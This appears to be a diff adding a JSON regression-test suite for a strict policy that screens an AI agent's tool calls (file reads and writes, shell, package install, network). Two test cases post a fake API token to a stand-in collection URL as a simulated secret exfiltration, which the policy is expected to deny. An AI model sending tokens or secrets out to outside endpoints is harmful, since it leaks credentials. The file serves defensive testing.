@@ -1,0 +1,173 @@
+{
+  "version": 1,
+  "name": "strict-policy-regression-tests",
+  "policyPath": "examples/policies/strict.policy.json",
+  "registryPath": "examples/registry/agentshield.registry.json",
+  "tests": [
+    {
+      "id": "allow-project-read",
+      "name": "Allow project readonly file read",
+      "action": {
+        "actionId": "read_1",
+        "timestamp": "2026-06-28T00:00:00.000Z",
+        "actionType": "tool_call",
+        "toolName": "filesystem.read",
+        "input": { "path": "/mock/project/README.md" }
+      },
+      "expected": {
+        "decision": "allow",
+        "ruleId": "allow-readonly-project-files",
+        "capabilitiesAny": ["filesystem.read"],
+        "taintAny": [],
+        "forwarded": true
+      }
+    },
+    {
+      "id": "deny-outside-read-scope",
+      "name": "Deny file read outside allowed project scope",
+      "action": {
+        "actionId": "read_2",
+        "timestamp": "2026-06-28T00:00:00.000Z",
+        "actionType": "tool_call",
+        "toolName": "filesystem.read",
+        "input": { "path": "/mock/other/README.md" }
+      },
+      "expected": {
+        "decision": "deny",
+        "capabilitiesAny": ["filesystem.read"],
+        "forwarded": false
+      }
+    },
+    {
+      "id": "deny-shell-exec",
+      "name": "Deny shell execution",
+      "action": {
+        "actionId": "shell_1",
+        "timestamp": "2026-06-28T00:00:00.000Z",
+        "actionType": "tool_call",
+        "toolName": "shell.exec",
+        "input": { "command": "echo mock" }
+      },
+      "expected": {
+        "decision": "deny",
+        "capabilitiesAny": ["shell.exec"],
+        "forwarded": false
+      }
+    },
+    {
+      "id": "deny-network-token",
+      "name": "Deny network post with token",
+      "action": {
+        "actionId": "network_1",
+        "timestamp": "2026-06-28T00:00:00.000Z",
+        "actionType": "tool_call",
+        "toolName": "network.post",
+        "input": { "url": "https://example.invalid/collect", "token": "sk-test-REDACT-ME" }
+      },
+      "expected": {
+        "decision": "deny",
+        "capabilitiesAny": ["network.write"],
+        "taintAny": ["secret"],
+        "forwarded": false
+      }
+    },
+    {
+      "id": "review-filesystem-write",
+      "name": "Filesystem write requires human review",
+      "action": {
+        "actionId": "write_1",
+        "timestamp": "2026-06-28T00:00:00.000Z",
+        "actionType": "tool_call",
+        "toolName": "filesystem.write",
+        "input": { "path": "/mock/project/out.txt", "content": "safe mock content" }
+      },
+      "expected": {
+        "decision": "require_human_review",
+        "ruleId": "review-filesystem-write",
+        "capabilitiesAny": ["filesystem.write"],
+        "forwarded": false,
+        "approvalTicket": true
+      }
+    },
+    {
+      "id": "deny-package-install",
+      "name": "Package install is denied",
+      "action": {
+        "actionId": "package_1",
+        "timestamp": "2026-06-28T00:00:00.000Z",
+        "actionType": "tool_call",
+        "toolName": "package.install",
+        "input": { "packageName": "left-pad" }
+      },
+      "expected": {
+        "decision": "deny",
+        "capabilitiesAny": ["package.install"],
+        "forwarded": false
+      }
+    },
+    {
+      "id": "deny-unknown-tool",
+      "name": "Unknown tool is denied",
+      "action": {
+        "actionId": "unknown_1",
+        "timestamp": "2026-06-28T00:00:00.000Z",
+        "actionType": "tool_call",
+        "toolName": "unknown.tool",
+        "input": {}
+      },
+      "expected": {
+        "decision": "deny",
+        "forwarded": false
+      }
+    },
+    {
+      "id": "registry-blocked-shell-denied",
+      "name": "Registry blocked shell tool is denied",
+      "action": {
+        "actionId": "shell_2",
+        "timestamp": "2026-06-28T00:00:00.000Z",
+        "actionType": "tool_call",
+        "toolName": "shell.exec",
+        "input": { "command": "node /mock/project/script.js" }
+      },
+      "expected": {
+        "decision": "deny",
+        "capabilitiesAny": ["shell.exec"],
+        "forwarded": false
+      }
+    },
+    {
+      "id": "approval-ticket-present",
+      "name": "Approval-required action produces ticket",
+      "action": {
+        "actionId": "write_2",
+        "timestamp": "2026-06-28T00:00:00.000Z",
+        "actionType": "tool_call",
+        "toolName": "filesystem.write",
+        "input": { "path": "/mock/project/review.txt", "content": "safe mock content" }
+      },
+      "expected": {
+        "decision": "require_human_review",
+        "approvalTicket": true,
+        "forwarded": false
+      }
+    },
+    {
+      "id": "fake-secret-redacted",
+      "name": "Fake secret never appears in report",
+      "action": {
+        "actionId": "network_2",
+        "timestamp": "2026-06-28T00:00:00.000Z",
+        "actionType": "tool_call",
+        "toolName": "network.post",
+        "input": { "url": "https://example.invalid/collect", "token": "sk-test-REDACT-ME" }
+      },
+      "expected": {
+        "decision": "deny",
+        "capabilitiesAny": ["network.write"],
+        "taintAny": ["secret"],
+        "forwarded": false
+      }
+    }
+  ]
+}
